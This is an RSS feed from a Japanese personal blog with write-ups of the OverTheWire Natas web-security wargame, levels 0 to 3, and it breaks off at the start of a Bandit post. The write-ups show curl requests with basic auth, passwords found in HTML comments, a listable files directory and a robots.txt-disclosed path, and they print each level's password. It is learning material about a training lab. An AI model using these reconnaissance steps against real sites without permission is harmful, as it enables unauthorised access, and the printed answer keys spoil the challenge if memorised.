<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>ただくんぶろぐ</title>
        <link>https://tadakun8.github.io/</link>
        <description>Recent content on ただくんぶろぐ</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>ja</language>
        <lastBuildDate>Sun, 04 Jul 2021 10:15:48 +0900</lastBuildDate><atom:link href="https://tadakun8.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>【OverTheWire奮闘記】Natas: Level2〜3</title>
        <link>https://tadakun8.github.io/post/over-the-wire/natas/level2-3/</link>
        <pubDate>Sun, 04 Jul 2021 10:15:48 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/natas/level2-3/</guid>
        <description>&lt;h2 id=&#34;level-2&#34;&gt;Level 2&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Username: natas2&lt;br&gt;
URL: &lt;a href=&#34;http://natas2.natas.labs.overthewire.org&#34;&gt;http://natas2.natas.labs.overthewire.org&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 194; flex-basis: 467px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/q.png&#34; data-size=&#34;2560x1314&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/q.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/q_hu2e7297c3a7fffabfbeae47786bad727c_446769_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/q_hu2e7297c3a7fffabfbeae47786bad727c_446769_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;2560&#34;
				height=&#34;1314&#34;
				loading=&#34;lazy&#34;
				alt=&#34;Question&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Question&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;answer&#34;&gt;Answer&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;answerまでにやったこと&#34;&gt;Answerまでにやったこと&lt;/h3&gt;
&lt;p&gt;ソースコードを見ると&lt;code&gt;files/pixel.png&lt;/code&gt;という画像ファイルがありました。&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 192; flex-basis: 462px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a1.png&#34; data-size=&#34;2560x1328&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a1.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a1_hu7367db0f61ed87a7f047571e6f1aa9f1_1219506_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a1_hu7367db0f61ed87a7f047571e6f1aa9f1_1219506_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;2560&#34;
				height=&#34;1328&#34;
				loading=&#34;lazy&#34;
				alt=&#34;ソースコード&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;ソースコード&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;この画像ファイルに何かあると思い、&lt;code&gt;http://natas2.natas.labs.overthewire.org/files/pixel.png&lt;/code&gt;でアクセスしてみましたが、真っ黒画像が表示されるだけでした。&lt;/p&gt;
&lt;p&gt;次にcurlで何か情報がないかと思ってみてみました。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/level.css&amp;quot;&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/jquery-ui.css&amp;quot; /&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/wechall.css&amp;quot; /&amp;gt;
&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-ui.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/wechall.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;var wechallinfo = { &amp;quot;level&amp;quot;: &amp;quot;natas2&amp;quot;, &amp;quot;pass&amp;quot;: &amp;quot;ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi&amp;quot; };&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;natas2&amp;lt;/h1&amp;gt;
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
There is nothing on this page
&amp;lt;img src=&amp;quot;files/pixel.png&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;・・・が、次のレベルのパスワードはありませんでした。&lt;/p&gt;
&lt;p&gt;諦めて回答を見てみました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://raidersec.blogspot.com/2012/10/overthewire-natas-wargame-level-2.html&#34;&gt;http://raidersec.blogspot.com/2012/10/overthewire-natas-wargame-level-2.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;なるほど、&lt;code&gt;pixel.png&lt;/code&gt;が格納されている&lt;code&gt;files&lt;/code&gt;ディレクトリにあるみたいです。なので&lt;code&gt;http://natas2.natas.labs.overthewire.org/files/&lt;/code&gt;でアクセスしてみると&lt;code&gt;user.txt&lt;/code&gt;がありました！&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 232; flex-basis: 557px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a2.png&#34; data-size=&#34;1268x546&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a2.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a2_huecbee5e683a6a9f17b8b7c2ceddade40_275686_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a2_huecbee5e683a6a9f17b8b7c2ceddade40_275686_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;1268&#34;
				height=&#34;546&#34;
				loading=&#34;lazy&#34;
				alt=&#34;http://natas2.natas.labs.overthewire.org/files/&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;&lt;a href=&#34;http://natas2.natas.labs.overthewire.org/files/&#34;&gt;http://natas2.natas.labs.overthewire.org/files/&lt;/a&gt;&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user.txt&lt;/code&gt;をクリックするとパスワードがわかりました。&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 307; flex-basis: 737px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a3.png&#34; data-size=&#34;1204x392&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a3.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a3_hu45bd1d7ce6d459c29e3477574432c2cc_161654_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level2/a3_hu45bd1d7ce6d459c29e3477574432c2cc_161654_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;1204&#34;
				height=&#34;392&#34;
				loading=&#34;lazy&#34;
				alt=&#34;user.txt&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;user.txt&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-3&#34;&gt;Level 3&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Username: natas3&lt;br&gt;
URL: &lt;a href=&#34;http://natas3.natas.labs.overthewire.org&#34;&gt;http://natas3.natas.labs.overthewire.org&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 192; flex-basis: 462px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/q.png&#34; data-size=&#34;2560x1328&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/q.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/q_hu7367db0f61ed87a7f047571e6f1aa9f1_137480_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/q_hu7367db0f61ed87a7f047571e6f1aa9f1_137480_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;2560&#34;
				height=&#34;1328&#34;
				loading=&#34;lazy&#34;
				alt=&#34;Question&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Question&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;answer-1&#34;&gt;Answer&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;answerまでにやったこと-1&#34;&gt;Answerまでにやったこと&lt;/h3&gt;
&lt;p&gt;ソースコードを見てみるとこんな一文がありました&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!-- No more information leaks!! Not even Google will find it this time... --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Googleでは見つけられないみたいなので、検索エンジンを変えればいけるかなと思って、DuckDuckGoに変えてみ変わらなかったです。ブラウザもSafariなどに変えてみましたがだめでした。&lt;/p&gt;
&lt;p&gt;次に、レスポンスヘッダーに格納されているのでは？と思いそちらも確認しましたが入ってなかったです&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ curl -i -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/
HTTP/1.1 200 OK
Date: Sun, 04 Jul 2021 02:12:46 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Tue, 20 Dec 2016 10:15:44 GMT
ETag: &amp;quot;39b-5441451aed400&amp;quot;
Accept-Ranges: bytes
Content-Length: 923
Vary: Accept-Encoding
Content-Type: text/html
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;こちらも諦めて回答を見てみました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://securitytimes.wordpress.com/2017/06/25/natas3-4/&#34;&gt;https://securitytimes.wordpress.com/2017/06/25/natas3-4/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;どうやら&lt;code&gt;robots.txt&lt;/code&gt;というファイルが関係していそうです&lt;/p&gt;
&lt;h3 id=&#34;robotstxtとは&#34;&gt;robots.txtとは&lt;/h3&gt;
&lt;p&gt;検索エンジンやクローラーにサイト内の一部のページの情報を収集されたくない場合に使用するファイルのことです。
目的の1つとしてはSEO対策です。ユーザーに価値のない情報を収集されてSEOを下げてしまいたくない場合が該当すると思います。&lt;/p&gt;
&lt;p&gt;他にも検索結果に表示されたくないページなどを指定する場合に使われます。&lt;/p&gt;
&lt;p&gt;使用する場合はwebサイトのトップディレクトリに格納する必要があります。&lt;/p&gt;
&lt;p&gt;似たような言葉で&lt;code&gt;インデックス&lt;/code&gt;という言葉があります。クロールがwebページの情報収集をするなら、インデックスはクローラが収集してきた情報を&lt;strong&gt;検索エンジンに登録する処理&lt;/strong&gt;のことです。インデックスされて初めて検索結果に表示されます。&lt;/p&gt;
&lt;h4 id=&#34;参考&#34;&gt;参考&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://developers.google.com/search/docs/advanced/robots/robots_txt?hl=ja&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Google による robots.txt の指定の解釈&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://sem-journal.com/seo/robots-txt/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;robots.txtとは？作り方・書き方・確認方法を解説します&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://bazubu.com/robots-txt-16678.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;サイト最適化の為のrobots.txtの書き方と効果的な活用方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://seeds-create.co.jp/google-search-console-crawl-index/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Google検索の仕組み「クロール」と「インデックス」の違い&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;robotstxtにアクセスしてみる&#34;&gt;robots.txtにアクセスしてみる&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;http://natas3.natas.labs.overthewire.org/robots.txt&lt;/code&gt;にアクセスしてみると&lt;code&gt;/s3cr3t/&lt;/code&gt;というディレクトリがクロールを拒否されていました。&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 362; flex-basis: 870px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a1.png&#34; data-size=&#34;1276x352&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a1.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a1_hu5ee3f19269061e7ede869f5d1b40f333_142007_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a1_hu5ee3f19269061e7ede869f5d1b40f333_142007_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;1276&#34;
				height=&#34;352&#34;
				loading=&#34;lazy&#34;
				alt=&#34;robots.txt&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;robots.txt&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;なので直接アクセスすると&lt;code&gt;users.txt&lt;/code&gt;を見つけました&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 274; flex-basis: 659px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a2.png&#34; data-size=&#34;1336x486&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a2.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a2_hub35d45b2d1c2aae6eec20cde0f6ade80_247365_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level2-3/level3/a2_hub35d45b2d1c2aae6eec20cde0f6ade80_247365_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;1336&#34;
				height=&#34;486&#34;
				loading=&#34;lazy&#34;
				alt=&#34;/s3cr3t/&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;/s3cr3t/&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;クリックするとパスワードが表示されます&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-txt:users.txt&#34; data-lang=&#34;txt:users.txt&#34;&gt;natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;
&lt;p&gt;まだレベルは浅いほうなのですが、すでに難しいと感じてます。今まで見向きもしなかったwebの知識が要求されるので調べながら1つ1つクリアしていきます！&lt;/p&gt;
&lt;p&gt;SEOはあまり意識していなかったのですが、ブロガーさんや企業さんがrobots.txtというものを使ってSEOを上げる努力をしているんだなぁと勉強になった回でした。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Natas: Level0〜1</title>
        <link>https://tadakun8.github.io/post/over-the-wire/natas/level0-1/</link>
        <pubDate>Sat, 03 Jul 2021 15:29:11 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/natas/level0-1/</guid>
        <description>&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;
&lt;p&gt;今回からのOverTheWireは&lt;code&gt;Natas&lt;/code&gt;に挑戦です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://overthewire.org/wargames/natas/&#34;&gt;https://overthewire.org/wargames/natas/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Natas&lt;/code&gt;ではサーバーサイドのウェブセキュリティ基礎を学ぶことができます。&lt;code&gt;Bandit&lt;/code&gt;ではSSHでサーバにログインして次のレベルへと進んでしましたが、&lt;code&gt;Natas&lt;/code&gt;ではwebサイトにアクセスして次のレベルへ進めます。次のレベルのパスワードを取得するということは変わっていません。&lt;/p&gt;
&lt;p&gt;また説明文には以下のように書いてあり&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;全てのパスワードが保存されている場所も示してくれています。何かヒントになるかもしれません。&lt;/p&gt;
&lt;p&gt;それでは挑戦していきます！&lt;/p&gt;
&lt;p&gt;(ちなみにNatasとはスペイン語でクリームという意味らしいです)&lt;/p&gt;
&lt;h2 id=&#34;level-0&#34;&gt;Level 0&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Username: natas0&lt;br&gt;
Password: natas0&lt;br&gt;
URL: &lt;a href=&#34;http://natas0.natas.labs.overthewire.org&#34;&gt;http://natas0.natas.labs.overthewire.org&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 193; flex-basis: 465px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/q.png&#34; data-size=&#34;2560x1320&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/q.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/q_huc3de3c09b353bba82738ee10424f7bb6_459882_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/q_huc3de3c09b353bba82738ee10424f7bb6_459882_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;2560&#34;
				height=&#34;1320&#34;
				loading=&#34;lazy&#34;
				alt=&#34;question&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;question&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;answer&#34;&gt;Answer&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gtVrDuiDfck831PqWsLEZy5gyDz1clto
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;answerまでにやったこと&#34;&gt;Answerまでにやったこと&lt;/h3&gt;
&lt;p&gt;どこにも書いてないと思ったので、chromeの開発者ツールでコードを見たらがっつり書いてました。&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 192; flex-basis: 462px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/a.png&#34; data-size=&#34;2560x1328&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/a.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/a_hu7367db0f61ed87a7f047571e6f1aa9f1_1045819_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level0/a_hu7367db0f61ed87a7f047571e6f1aa9f1_1045819_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;2560&#34;
				height=&#34;1328&#34;
				loading=&#34;lazy&#34;
				alt=&#34;Answer&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Answer&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;curlでも見れます&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org/
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/level.css&amp;quot;&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/jquery-ui.css&amp;quot; /&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/wechall.css&amp;quot; /&amp;gt;
&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-ui.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/wechall.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;var wechallinfo = { &amp;quot;level&amp;quot;: &amp;quot;natas0&amp;quot;, &amp;quot;pass&amp;quot;: &amp;quot;natas0&amp;quot; };&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;natas0&amp;lt;/h1&amp;gt;
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
You can find the password for the next level on this page.

&amp;lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;curl&lt;/code&gt;でbasic認証をしているwebサイトにアクセするためには&lt;code&gt;-u&lt;/code&gt;オプションをつけるとみることができます。形式は &lt;code&gt;-u ユーザ名:パスワード&lt;/code&gt;です。&lt;/p&gt;
&lt;h2 id=&#34;level-1&#34;&gt;Level 1&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Username: natas1&lt;br&gt;
URL: &lt;a href=&#34;http://natas1.natas.labs.overthewire.org&#34;&gt;http://natas1.natas.labs.overthewire.org&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 192; flex-basis: 462px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/q.png&#34; data-size=&#34;2558x1328&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/q.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/q_hu0dc1a220916182eb143665a689726084_499879_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/q_hu0dc1a220916182eb143665a689726084_499879_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;2558&#34;
				height=&#34;1328&#34;
				loading=&#34;lazy&#34;
				alt=&#34;question&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;question&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;answer-1&#34;&gt;Answer&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;answerまでにやったこと-1&#34;&gt;Answerまでにやったこと&lt;/h3&gt;
&lt;p&gt;右クリックを押すとAlartが表示されます。右クリックから出なくても、F12ボタンで開発者ツールは開けるのでソースコードは見れます。&lt;/p&gt;
&lt;p&gt;&lt;figure style=&#34;flex-grow: 193; flex-basis: 464px&#34;&gt;
		&lt;a href=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/a.png&#34; data-size=&#34;2560x1322&#34;&gt;&lt;img src=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/a.png&#34;
				srcset=&#34;https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/a_hu00e68d9b1266f809414b9b065a00dc5e_1118405_480x0_resize_box_2.png 480w, https://tadakun8.github.io/post/over-the-wire/natas/level0-1/level1/a_hu00e68d9b1266f809414b9b065a00dc5e_1118405_1024x0_resize_box_2.png 1024w&#34;
				width=&#34;2560&#34;
				height=&#34;1322&#34;
				loading=&#34;lazy&#34;
				alt=&#34;Answer&#34;&gt;
		&lt;/a&gt;
		
		&lt;figcaption&gt;Answer&lt;/figcaption&gt;
		
	&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;curlでも同じようにできます。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org                          ?[master]
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/level.css&amp;quot;&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/jquery-ui.css&amp;quot; /&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;http://natas.labs.overthewire.org/css/wechall.css&amp;quot; /&amp;gt;
&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/jquery-ui.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&amp;quot;http://natas.labs.overthewire.org/js/wechall.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;var wechallinfo = { &amp;quot;level&amp;quot;: &amp;quot;natas1&amp;quot;, &amp;quot;pass&amp;quot;: &amp;quot;gtVrDuiDfck831PqWsLEZy5gyDz1clto&amp;quot; };&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body oncontextmenu=&amp;quot;javascript:alert(&#39;right clicking has been blocked!&#39;);return false;&amp;quot;&amp;gt;
&amp;lt;h1&amp;gt;natas1&amp;lt;/h1&amp;gt;
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
You can find the password for the
next level on this page, but rightclicking has been blocked!

&amp;lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;
&lt;p&gt;ページにある&lt;code&gt;WeChall&lt;/code&gt;とはなんのかをざっと調べたところOverTheWireと同じようにハッキングを学べるサイトのようです。こちらはOverTheWireにも説明が書いてありました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://overthewire.org/information/wechall.html&#34;&gt;https://overthewire.org/information/wechall.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;どうやらWeChallとOverTheWireは連携していて、WeChallのユーザがOverTheWireをどこまでクリアしたかがわかるようです。&lt;/p&gt;
&lt;p&gt;このOverTheWireが終わったら、次にこのサイトに挑戦してみるのもいいかもしれません。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level33〜34</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level33-34/</link>
        <pubDate>Thu, 01 Jul 2021 22:30:54 +0900</pubDate>
        
